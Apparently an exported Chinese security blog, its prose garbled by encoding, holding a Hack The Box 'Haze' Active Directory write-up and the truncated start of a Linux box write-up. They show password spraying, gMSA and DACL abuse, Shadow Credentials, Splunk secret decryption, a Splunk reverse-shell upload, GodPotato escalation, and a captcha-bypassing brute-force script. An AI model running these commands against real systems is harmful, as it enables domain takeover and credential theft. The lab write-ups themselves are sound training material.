å¯ä»¥çœ‹åˆ°è¿˜æœ‰å…¶ä»–å‡ ä¸ªç”¨æˆ·\nmark.adams\redward.martin\ralexander.green\rHaze-IT-Backup$ å°è¯•è¿›è¡Œå¯†ç å–·æ´’ï¼Œç¡®å®å­˜åœ¨å¯†ç å¤ç”¨çš„é—®é¢˜ã€‚\n[root@kali] /home/kali/Haze â¯ crackmapexec smb haze.htb -u usernames.txt -p \u0026#39;Ld@p_Authxxxxxxxxxx\u0026#39; â\rSMB Haze.htb 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)\rSMB Haze.htb 445 DC01 [+] haze.htb\\mark.adams:Ld@p_Authxxxxxxxxxx Bloodhound-1 #\r[root@kali] /home/kali/Haze â¯ bloodhound-python -u \u0026#39;mark.adams\u0026#39; -p \u0026#39;Ld@p_Authxxxxxxxxxx\u0026#39; -d haze.htb -dc dc01.haze.htb -ns 10.10.xx.xx -c all --zip INFO: Found AD domain: haze.htb\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 8 users\rINFO: Found 57 groups\rINFO: Found 2 gpos\rINFO: Found 2 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc01.haze.htb\rINFO: Done in 00M 50S å‘ç°markå±äºä¸€ä¸ªGMSAï¼ˆGroup Managed Service AccountsÂ ï¼‰çš„ç®¡ç†å‘˜ç»„\nâ€‹ä½œä¸ºgMSA ç®¡ç†å‘˜ç»„çš„æˆå‘˜ï¼Œæ‚¨æ‹¥æœ‰æ£€ç´¢å’Œç®¡ç†ç»„æ‰˜ç®¡æœåŠ¡è´¦æˆ·ï¼ˆgMSAï¼‰å¯†ç çš„æƒé™ã€‚â€‹å¦‚æœæ‚¨å¸Œæœ›äº†è§£å¦‚ä½•åˆ©ç”¨æ­¤æƒé™è¿›è¡Œæ”»å‡»ï¼Œä»¥ä¸‹æ˜¯å¯èƒ½çš„é€”å¾„ï¼š\nç›´æ¥è¯»å– gMSA å¯†ç ï¼š gMSA çš„å¯†ç å­˜å‚¨åœ¨ Active Directory çš„ msDS-ManagedPassword å±æ€§ä¸­ï¼Œåªæœ‰è¢«æˆæƒçš„è´¦æˆ·ï¼ˆå¦‚ gMSA ç®¡ç†å‘˜ç»„æˆå‘˜ï¼‰æ‰èƒ½è®¿é—®ã€‚ä½œä¸ºç®¡ç†å‘˜ç»„æˆå‘˜ï¼Œæ‚¨å¯ä»¥ç›´æ¥æ£€ç´¢å¹¶è§£å¯†è¯¥å±æ€§ï¼Œè·å–æ˜æ–‡å¯†ç ã€‚è¿™ä½¿æ‚¨èƒ½å¤Ÿä»¥ gMSA çš„èº«ä»½ç™»å½•æˆ–æ‰§è¡Œæ“ä½œï¼Œå¯èƒ½è·å¾—æ›´é«˜çš„ç³»ç»Ÿæƒé™ã€‚\nNTLM ä¸­ç»§æ”»å‡»ï¼š åˆ©ç”¨ NTLM åè®®çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å°† NTLM èº«ä»½éªŒè¯è¯·æ±‚ä¸­ç»§åˆ° LDAP æˆ– LDAPS æœåŠ¡ï¼Œè¿›è€Œè®¿é—® msDS-ManagedPassword å±æ€§ï¼Œè·å– gMSA å¯†ç ã€‚ç„¶è€Œï¼Œæ­¤æ–¹æ³•éœ€è¦ç‰¹å®šçš„ç½‘ç»œæ¡ä»¶å’Œé…ç½®ï¼Œä¸”æˆåŠŸç‡å—é™ã€‚\né»„é‡‘ gMSA æ”»å‡»ï¼š å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè®¿é—®å¯†é’¥åˆ†å‘æœåŠ¡ï¼ˆKDSï¼‰æ ¹å¯†é’¥å±æ€§ï¼Œä»–ä»¬å¯ä»¥ç¦»çº¿ç”Ÿæˆæ‰€æœ‰å…³è” gMSA çš„å¯†ç ã€‚è¿™è¢«ç§°ä¸ºâ€œé»„é‡‘ gMSAâ€æ”»å‡»ï¼Œå…è®¸æ”»å‡»è€…åœ¨ä¸è§¦å‘å¯†ç æ›´æ”¹æˆ–è®¿é—®æ—¥å¿—çš„æƒ…å†µä¸‹ï¼ŒæŒç»­è·å– gMSA çš„å¯†ç ã€‚\nReadGMSAPassword #\rå°è¯•è¿›è¡Œè¯»å–å¯†ç ï¼šReadGMSAPassword | The Hacker Recipes\n[root@kali] /home/kali/Haze/gMSADumper (main) â¯ python gMSADumper.py -u \u0026#39;mark.adams\u0026#39; -p \u0026#39;Ld@p_Autxxxxxxxxxxx\u0026#39; -d haze.htb\rUsers or groups who can read password for Haze-IT-Backup$:\r\u0026gt; Domain Admins å¯ä»¥çœ‹åˆ°å½“å‰markæ²¡æœ‰è¿™ä¸ªæƒé™ï¼Œä¸è¿‡markå±äºç®¡ç†å‘˜ç»„ï¼Œå¯ä»¥ç»™è‡ªå·±åŠ æƒé™ã€‚\næ³¨æ„gMSAå¹¶ä¸æ˜¯ä¸€ä¸ªç»„ï¼Œè€Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„è´¦æˆ·ç±»å‹ï¼ï¼æ‰€ä»¥åœ¨bloodhoundé‡ŒæŸ¥çœ‹ä¸åˆ°\nå¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤æ£€æŸ¥ **Haze-IT-Backup$**çš„è´¦æˆ·ç±»å‹\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass\rName ObjectClass\r---- -----------\rHaze-IT-Backup msDS-GroupManagedServiceAccount è°æœ‰æƒé™æŸ¥çœ‹ä»–çš„å¯†ç ï¼Œç¡®å®åªæœ‰Domain Admins\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Get-ADServiceAccount -Identity \u0026#34;Haze-IT-Backup$\u0026#34; -Properties PrincipalsAllowedToRetrieveManagedPassword\rDistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\rEnabled : True\rName : Haze-IT-Backup\rObjectClass : msDS-GroupManagedServiceAccount\rObjectGUID : 66f8d593-2f0b-4a56-95b4-01b326c7a780\rPrincipalsAllowedToRetrieveManagedPassword : {CN=Domain Admins,CN=Users,DC=haze,DC=htb}\rSamAccountName : Haze-IT-Backup$\rSID : S-1-5-21-323145914-28650650-2368316563-1111\rUserPrincipalName : æ¯•ç«Ÿmarkæ˜¯gMSAç®¡ç†å‘˜ç»„çš„ï¼Œå°è¯•ä¿®æ”¹ä¸€ä¸‹å¯è¯»ç”¨æˆ·å‘¢\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Set-ADServiceAccount -Identity \u0026#34;Haze-IT-Backup$\u0026#34; -PrincipalsAllowedToRetrieveManagedPassword \u0026#34;mark.adams\u0026#34;\r*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; Get-ADServiceAccount -Identity \u0026#34;Haze-IT-Backup$\u0026#34; -Properties PrincipalsAllowedToRetrieveManagedPassword\rDistinguishedName : CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb\rEnabled : True\rName : Haze-IT-Backup\rObjectClass : msDS-GroupManagedServiceAccount\rObjectGUID : 66f8d593-2f0b-4a56-95b4-01b326c7a780\rPrincipalsAllowedToRetrieveManagedPassword : {CN=Mark Adams,CN=Users,DC=haze,DC=htb}\rSamAccountName : Haze-IT-Backup$\rSID : S-1-5-21-323145914-28650650-2368316563-1111\rUserPrincipalName : ç„¶åå†å»è¯»å–ï¼Œå¯ä»¥å‘ç°æˆåŠŸã€‚è¿™é‡Œåº”è¯¥æ˜¯æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œå› ä¸ºè¿‡ä¸€ä¼šè¿™ä¸ªç”¨æˆ·åˆæ— æ³•è¯»å–äº†\nå°½ç®¡æ‹¿åˆ°äº†å“ˆå¸Œå€¼ï¼Œä½†æ˜¯æ— æ³•é€šè¿‡5985ç«¯å£è¿ä¸Šå»\nä¸ºäº†éªŒè¯mark.adamç¡®å®æ˜¯æœ‰å†™å…¥æƒé™çš„ï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹Backupçš„è®¿é—®æ§åˆ¶è¡¨\n*Evil-WinRM* PS C:\\Users\\mark.adams\\Documents\u0026gt; dsacls \u0026#34;CN=HAZE-IT-BACKUP,CN=MANAGED SERVICE ACCOUNTS,DC=HAZE,DC=HTB\u0026#34; ms-DS-GroupMSAMembership attribute - Win32 apps | Microsoft Learn msDS-GroupMSAMembership æ˜¯ Active Directory (AD) ä¸­ ç®¡ç†æœåŠ¡è´¦æˆ·ï¼ˆgMSAï¼‰ ç›¸å…³çš„ä¸€ä¸ªå±æ€§ã€‚å®ƒç”¨äº å­˜å‚¨å¯ä»¥æ£€ç´¢ gMSA å¯†ç çš„ç»„ï¼Œå³ å…è®¸å“ªäº›ç»„æˆ–å¯¹è±¡è¯»å– è¯¥ ç»„ç®¡ç†æœåŠ¡è´¦æˆ·ï¼ˆgMSAï¼‰ çš„å¯†ç ã€‚\nç”±äºmarkæ˜¯gMSA_Managersç»„çš„ï¼Œå› æ­¤å¯ä»¥ä¿®æ”¹è¿™ä¸ªå€¼ï¼Œä»è€Œè·å–åˆ°Backupçš„å¯†ç å“ˆå¸Œã€‚\nBloodHound-2 #\ræ³¨æ„ï¼ï¼ï¼ï¼ï¼ï¼ï¼\nå¦‚æœä½¿ç”¨çš„æ˜¯mark.adamsè¿›è¡ŒåŸŸå†…æœé›†çš„è¯ï¼Œä¼šå› ä¸ºæƒé™çš„é—®é¢˜é€ æˆéƒ¨åˆ†ä¿¡æ¯ç¼ºå¤±ã€‚\né‚£ä¹ˆæœ€å¥½çš„ä¹ æƒ¯å°±æ˜¯ï¼Œæ‹¿åˆ°ä¸€ä¸ªåŸŸå†…ç”¨æˆ·å°±å°è¯•æ›´æ–°bloodhoundçš„å†…å®¹ã€‚\n[root@kali] /home/kali/Haze â¯ bloodhound-python -u \u0026#39;Haze-IT-Backup$\u0026#39; --hashes \u0026#39;:735c02cXXXXXXXXXXXXXXXXXXX\u0026#39; -d haze.htb -dc dc01.haze.htb -ns 10.xx.xx.xx -c all --zip\rINFO: Found AD domain: haze.htb\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: dc01.haze.htb\rINFO: Found 9 users\rINFO: Found 57 groups\rINFO: Found 2 gpos\rINFO: Found 2 ous\rINFO: Found 20 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: dc01.haze.htb\rINFO: Done in 01M 07S å¯ä»¥çœ‹åˆ°BACKUPç”¨æˆ·å¯ä»¥ä¿®æ”¹SUPPORTç»„çš„æ‹¥æœ‰è€…ï¼Œè€ŒSUPPORTç»„å¯ä»¥ä¿®æ”¹EDWARDçš„å¯†ç å’Œè¿›è¡ŒShadow Credentialæ”»å‡»\næ¥ä¸‹æ¥å…ˆå°†Backupè®¾ç½®ä¸ºç»„æ‹¥æœ‰è€…\n[root@kali] /home/kali/Haze â¯ bloodyAD --host \u0026#34;10.xxx.xxx.xxx\u0026#34; -d \u0026#34;haze.htb\u0026#34; -u \u0026#34;Haze-IT-Backup$\u0026#34; -p \u0026#34;:735c0xxxxxxxxxxxxxxxxxxxx\u0026#34; set owner SUPPORT_SERVICES Haze-IT-Backup$\r[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on SUPPORT_SERVICES ç»™è‡ªå·±åŠ ä¸Šå…¨éƒ¨æƒé™\n[root@kali] /home/kali/Haze â¯ impacket-dacledit -action write -rights FullControl -principal \u0026#39;Haze-IT-Backup$\u0026#39; -target-dn \u0026#39;CN=SUPPORT_SERVICES,CN=USERS,DC=HAZE,DC=HTB\u0026#39; -dc-ip 10.xx.xx.xx\u0026#34;haze.htb/Haze-IT-Backup$\u0026#34; -hashes \u0026#39;:735c02c6xxxxxxxxxxxxxxxxxxx\u0026#39;\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] DACL backed up [*] DACL modified successfully! è¿˜è¦æŠŠè‡ªå·±åŠ åˆ°ç»„é‡Œé¢å»\n[root@kali] /home/kali/Haze/pywhisker/pywhisker (main) âš¡ â¯ bloodyAD --host \u0026#34;10.xx.xx.xx\u0026#34; -d \u0026#34;haze.htb\u0026#34; -u \u0026#34;Haze-IT-Backup$\u0026#34; -p \u0026#34;:735c0XXXXXXXXXXXXXXXXXXXXXXXX\u0026#34; add groupMember SUPPORT_SERVICES Haze-IT-Backup$\r[+] Haze-IT-Backup$ added to SUPPORT_SERVICES Shadow Credential #\rShutdownRepo/pywhisker: Python version of the C# tool for \u0026ldquo;Shadow Credentials\u0026rdquo; attacks [root@kali] /home/kali/Haze/pywhisker/pywhisker (main) âš¡ â¯ python pywhisker.py -d \u0026#34;haze.htb\u0026#34; -u \u0026#34;Haze-IT-Backup$\u0026#34; -H \u0026#39;735c0XXXXXXXXXXXXXXXXXXXX\u0026#39; --target edward.martin --action add\r[*] Searching for the target account\r[*] Target user found: CN=Edward Martin,CN=Users,DC=haze,DC=htb\r[*] Generating certificate\r[*] Certificate generated\r[*] Generating KeyCredential\r[*] KeyCredential generated with DeviceID: ad2dab15-1705-97ae-2a31-3e7dc76e9ae0\r[*] Updating the msDS-KeyCredentialLink attribute of edward.martin\r[+] Updated the msDS-KeyCredentialLink attribute of the target object\r[*] Converting PEM -\u0026gt; PFX with cryptography: c00sSu5E.pfx\r[+] PFX exportiert nach: c00sSu5E.pfx\r[i] Passwort fÃ¼r PFX: nppJ5hulBJapp4MbWmei\r[+] Saved PFX (#PKCS12) certificate \u0026amp; key at path: c00sSu5E.pfx\r[*] Must be used with password: nppJ5hulBJapp4MbWmei\r[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools ä½¿ç”¨ä»–æä¾›çš„å·¥å…·ğŸ‘‡\ndirkjanm/PKINITtools: Tools for Kerberos PKINIT and relaying to AD CS ä½¿ç”¨åˆšæ‰ç”Ÿæˆçš„è¯ä¹¦æ¥è¯·æ±‚ä¸€ä¸ªTGTï¼Œè¿™é‡Œçš„å‚æ•°åœ¨ä¸Šé¢æä¾›äº†\n[root@kali] /home/kali/Haze/pywhisker/pywhisker/PKINITtools (master) â¯ python gettgtpkinit.py -cert-pfx ../c00sSu5E.pfx -pfx-pass nppJ5hulBJapp4MbWmei haze.htb/edward.martin edward.ccache è®¾ç½®ç¯å¢ƒå˜é‡\n[root@kali] /home/kali/Haze/pywhisker/pywhisker/PKINITtools (master) â¯ export KRB5CCNAME=/home/kali/Haze/pywhisker/pywhisker/PKINITtools/edward.ccache ç„¶åè¯·æ±‚nthash\n[root@kali] /home/kali/Haze/pywhisker/pywhisker/PKINITtools (master) â¯ python getnthash.py -key d0fe683700624e9392a976017afd89838fa7c4035c5889474a92cbdda68554b9 haze.htb/edward.martin\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Using TGT from cache\r[*] Requesting ticket to self with PAC\rRecovered NT Hash\r09e0b3eeb2xxxxxxxxxxxxxxxxxxxxxx æœ€åç™»å½•ä¸Šå»æ‹¿åˆ°User\nPrivilege Escalation #\ræ³¨æ„åˆ°æ ¹ç›®å½•ä¸‹æœ‰ä¸ªBackupç›®å½•ï¼Œè¿™ä¸ªç›®å½•æˆ‘ä»¬ä¹‹å‰æ˜¯æ— æ³•è¿›å…¥çš„\nä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œå°±æ˜¯ç½‘ç«™çš„å¤‡ä»½æºç ï¼Œé‡Œé¢å’Œå®é™…ç½‘ç«™å†…å®¹æœ‰å·®åˆ«çš„ã€‚\nè¿™é‡Œç›´æ¥æŸ¥æ‰¾ç±»ä¼¼å¯†ç çš„å­—ç¬¦ä¸²ï¼Œæ ¹æ®splunkçš„å¯†ç æ ¼å¼æŸ¥æ‰¾\n[root@kali] /home/kali/Haze/splunk/Splunk â¯ grep -rI \u0026#39;\\$1\\$\u0026#39; .\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;. This is used by\r./etc/system/README/server.conf.spec: * NOTE: Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, because this is\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as Splunk software uses\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/server.conf.spec:* Unencrypted passwords must not begin with \u0026#34;$1$\u0026#34;, as this is used by\r./etc/system/README/indexes.conf.spec:* Unencrypted access key cannot begin with \u0026#34;$1$\u0026#34; or \u0026#34;$7$\u0026#34;. These prefixes are reserved\r./etc/system/README/indexes.conf.spec:* Unencrypted secret key cannot begin with \u0026#34;$1$\u0026#34; or \u0026#34;$7$\u0026#34;. These prefixes are reserved\r./etc/system/README/outputs.conf.example:token=$1$/fRSBT+2APNAyCB7tlcgOyLnAtqAQFC8NI4TGA2wX4JHfN5d9g==\r./var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfXXXXXXXXXXXX\r./lib/node_modules/pdfkit/lib/mixins/color.coffee: color = color.replace(/#([0-9A-F])([0-9A-F])([0-9A-F])/i, \u0026#34;#$1$1$2$2$3$3\u0026#34;) if color.length is 4 ç„¶åç”¨splunksecretsè¿›è¡Œè§£å¯†ï¼Œæ³¨æ„è¿™é‡Œçš„secretæ˜¯å¤‡ä»½ä»£ç ä¸­çš„ã€‚\n[root@kali] /home/kali/Haze â¯ splunksecrets splunk-decrypt -S splunk/Splunk/etc/auth/splunk.secret â\rCiphertext: $1$YDz8WfhXXXXXXXXXXXXXXX\rSp1unkXXXXXXXXXX ä½¿ç”¨ç”¨æˆ·åadminå³å¯ç™»å½•åˆ°åå°\n0xjpuff/reverse_shell_splunk: A simple splunk package for obtaining reverse shells on both Windows and most *nix systems. æ ¹æ®è¯´æ˜ä¿®æ”¹ipå’Œç«¯å£åä¸Šä¼ ï¼Œå¾—åˆ°åå¼¹shell\næŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æƒé™ä¿¡æ¯\nPS C:\\Windows\\system32\u0026gt; whoami /all\rUSER INFORMATION\r----------------\rUser Name SID ==================== ===========================================\rhaze\\alexander.green S-1-5-21-323145914-28650650-2368316563-1106\rGROUP INFORMATION\r-----------------\rGroup Name Type SID Attributes ========================================== ================ =========================================== ==================================================\rEveryone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\rBUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group\rCONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group\rNT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group\rLOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group\rHAZE\\Splunk_Admins Group S-1-5-21-323145914-28650650-2368316563-1108 Mandatory group, Enabled by default, Enabled group\rAuthentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group\rMandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION\r----------------------\rPrivilege Name Description State ============================= ========================================= ========\rSeMachineAccountPrivilege Add workstations to domain Disabled\rSeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled\rUSER CLAIMS INFORMATION\r-----------------------\rUser claims unknown. SeImpersonatePrivilege æ˜¯ Windows ç³»ç»Ÿä¸­çš„ä¸€ç§æƒé™ï¼Œèµ‹äºˆè¿›ç¨‹ â€œæ¨¡æ‹Ÿï¼ˆImpersonationï¼‰â€ çš„èƒ½åŠ›ã€‚\næ‹¥æœ‰è¯¥æƒé™çš„è¿›ç¨‹å¯ä»¥åœ¨è·å¾—æŸä¸ªä»¤ç‰Œï¼ˆTokenï¼‰å¥æŸ„åï¼Œæ¨¡æ‹Ÿè¯¥ä»¤ç‰Œå¯¹åº”çš„ç”¨æˆ·èº«ä»½ï¼Œä½†æ— æ³•ç›´æ¥åˆ›å»ºæ–°çš„ä»¤ç‰Œã€‚\nå¯ä»¥åœ¨è¿™é‡ŒæŸ¥æ‰¾åˆ°è¿™ä¸ªç»„çš„åˆ©ç”¨ğŸ‘‡\nAbusing Tokens - HackTricks ./GodPotato-NET4.exe -cmd \u0026#39;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt\u0026#39; å¯ä»¥çœ‹åˆ°æˆåŠŸè¯»å–ï¼Œå½“ç„¶å…¶ä»–çš„ä¸€äº›Potatoä¹Ÿèƒ½è¿™æ ·æ‰§è¡Œ\né™¤äº†è¿™ä¸ªæ–¹å¼ï¼Œä¹Ÿå¯ä»¥é€šè¿‡meterpreter\næ‹¿åˆ°å“ˆå¸Œä¹‹åé€šè¿‡5985ç™»å½•æ‹¿åˆ°Administratorçš„shell\nSummary #\rUserï¼šä»»æ„æ–‡ä»¶è¯»å–æ‹¿åˆ°å¯†ç ä»¥åŠå¯†é’¥secretï¼Œé€šè¿‡å·¥å…·è§£å¯†å¾—åˆ°pualå’Œmarkå…±ç”¨çš„å¯†ç ã€‚markæ˜¯GMSAç»„çš„ç®¡ç†å‘˜ï¼Œå› æ­¤å¯ä»¥å°è¯•è¯»å–åˆ°Backupç”¨æˆ·çš„å¯†ç å“ˆå¸Œã€‚æ‹¿åˆ°Backupä¹‹åå†æ¬¡è¿›è¡ŒåŸŸå†…åˆ†æï¼Œå¯ä»¥è¿›è¡ŒShadowCredentialæ”»å‡»ï¼Œæœ€åæ‹¿åˆ°userã€‚\nRootï¼šé€šè¿‡ä¸‹è½½å¤‡ä»½æºç åˆ†æï¼Œå¾—åˆ°adminç”¨æˆ·çš„ç™»å½•å¯†ç ï¼Œåˆ°åå°ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„æ’ä»¶ã€‚å¾—åˆ°Alexanderç”¨æˆ·ï¼Œè¿™ä¸ªç”¨æˆ·åœ¨SeImpersonatePrivilegeç»„ä¸­ï¼Œå¯ä»¥è¿›è¡Œææƒæ“ä½œã€‚\n","date":"2025-03-31","externalUrl":null,"permalink":"/posts/2025/03/htb-haze/","section":"Posts","summary":"","title":"HTB-Haze","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.131 -sV -A -p-\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2 (protocol 2.0)\r| ssh-hostkey: | 256 f6:91:6b:ad:ea:ad:1d:b9:44:09:d8:74:a3:02:38:35 (ECDSA)\r|_ 256 b6:66:2f:f0:4c:26:7f:7d:14:ea:b3:62:09:64:a7:94 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-title: Apache2 Ubuntu Default Page: It works\r|_http-server-header: Apache/2.4.62 (Debian) è¿›å…¥80ç«¯å£æŸ¥çœ‹ï¼Œæ˜¯ä¸€ä¸ªapacheé»˜è®¤é¡µ\nGobuster #\rè¿›è¡Œç›®å½•æ‰«æï¼Œæ²¡æœ‰æ‰«åˆ°ä»»ä½•ä¸œè¥¿\n[root@kali] /home/kali â¯ gobuster dir -u http://192.168.56.131/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.131/\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: html,php,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.php (Status: 403) [Size: 279]\r/index.html (Status: 200) [Size: 11539]\r/.html (Status: 403) [Size: 279]\r/.html (Status: 403) [Size: 279]\r/.php (Status: 403) [Size: 279]\r/server-status (Status: 403) [Size: 279]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== åœ¨ç½‘é¡µæºç ä¸­å‘ç°æ³¨é‡Šï¼Œå¯ä»¥è®¿é—®**/finexo**\nWeak Passwd #\ræ³¨æ„åˆ°è¿™é‡Œçš„å›¢é˜Ÿæˆå‘˜ï¼Œéƒ½æ˜¯æµ·ç»µå®å®ä¸­çš„äººç‰©\næ¥åˆ°ç™»å½•é¡µé¢ï¼Œå‘ç°è¿™é‡Œå­˜åœ¨éªŒè¯ç æ ¡éªŒï¼Œå¹¶ä¸”æœ‰ä¸‰ç§å›æ˜¾ï¼šç”¨æˆ·ä¸å­˜åœ¨ã€å¯†ç é”™è¯¯ã€ä»¥åŠéªŒè¯ç é”™è¯¯\nç»è¿‡å°è¯•ï¼Œå‘ç°å­˜åœ¨çš„ç”¨æˆ·æ˜¯ï¼šspongebob\nè¿™é‡Œçš„éªŒè¯ç ç”Ÿæˆé€»è¾‘æ˜¯ç›´æ¥ä»å½“å‰é¡µé¢è¿›è¡Œè¯·æ±‚ï¼Œç„¶åé€šè¿‡Canvasç»˜åˆ¶åˆ°å›¾ç‰‡ä¸Š\nfunction refreshCaptcha() {\rvar xhr = new XMLHttpRequest();\rxhr.open(\u0026#39;GET\u0026#39;, \u0026#39;?action=generateCaptcha\u0026#39;, true);\rxhr.onload = function() {\rif (xhr.status === 200) {\rvar newCaptcha = xhr.responseText;\rconst canvas = document.getElementById(\u0026#34;captcha-canvas\u0026#34;);\rconst ctx = canvas.getContext(\u0026#34;2d\u0026#34;);\rcanvas.width = 150;\rcanvas.height = 50;\rctx.fillStyle = \u0026#34;white\u0026#34;;\rctx.fillRect(0, 0, canvas.width, canvas.height);\rctx.fillStyle = \u0026#34;black\u0026#34;;\rctx.font = \u0026#34;30px Arial\u0026#34;;\rctx.fillText(newCaptcha, 10,35);\r}\r};\rxhr.send();\r}\rrefreshCaptcha()\rwindow.onload =function() {\rParticles.init({\rselector:\r\u0026#39;.background\u0026#39;,\rcolor:\u0026#39;white\u0026#39;\r});\r}; åœ¨å¦ä¸€ä¸ªjsæ–‡ä»¶ä¸­å‘ç°äº†ä¸€ä¸²å¯†æ–‡\nJSFuck Language Translator - Online Decoder/Compiler/Unobfuscator è¿›è¡Œè§£å¯†åå¾—åˆ°éªŒè¯ç çš„ç”Ÿæˆé€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯PHPçš„mt_srandä¼ªéšæœºé—®é¢˜ï¼Œä½¿ç”¨äº†å½“å‰æ—¶é—´ä½œä¸ºç§å­\nfunction generateCaptcha() { $characters = \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\u0026#34;; $code = \u0026#34;\u0026#34;; $seed = time(); mt_srand($seed); for ($i = 0; $i \u0026lt; 4; $i++) { $code .= $characters[mt_rand(0, strlen($characters) - 1)]; } $_SESSION[\u0026#39;captcha\u0026#39;] = strtolower($code); return $code; } é€šè¿‡å†™è„šæœ¬åˆ†åˆ«è¯·æ±‚æ¥è¿›è¡Œçˆ†ç ´çš„è¯\nimport requests\rcaptcha_url = \u0026#39;http://192.168.56.132/finexo/login.php?action=generateCaptcha\u0026#39;\rlogin_url = \u0026#39;http://192.168.56.132/finexo/login.php\u0026#39;\r# åˆ›å»ºä¼šè¯å¯¹è±¡\rsession = requests.Session()\rcnt =0\rwith open(\u0026#39;/usr/share/wordlists/rockyou_utf_8.txt\u0026#39;, \u0026#39;r\u0026#39;) as f:\rfor password in f.readlines():\r# è·å–éªŒè¯ç \rcaptcha = session.get(captcha_url).text\rpassword = password.strip() # å»é™¤å¯†ç ä¸¤ç«¯çš„ç©ºç™½å­—ç¬¦\rdata={\r\u0026#39;username\u0026#39;:\u0026#39;spongebob\u0026#39;,\r\u0026#39;password\u0026#39;:f\u0026#39;{password}\u0026#39;,\r\u0026#39;captcha\u0026#39;: captcha\r}\r# ä½¿ç”¨ä¼šè¯å¯¹è±¡å‘é€POSTè¯·æ±‚è¿›è¡Œç™»å½•\rtry_login = session.post(login_url, data=data)\rcnt +=1\r# è¾“å‡ºç™»å½•ç»“æœ\rprint(f\u0026#34;Attempting with password: {password} {cnt}\u0026#34;)\r# æ£€æŸ¥æ˜¯å¦ç™»å½•æˆåŠŸï¼Œå‡è®¾è¿”å›çš„æ–‡æœ¬åŒ…å«æŸä¸ªæˆåŠŸæ ‡å¿—\rif \u0026#34;successful\u0026#34; in 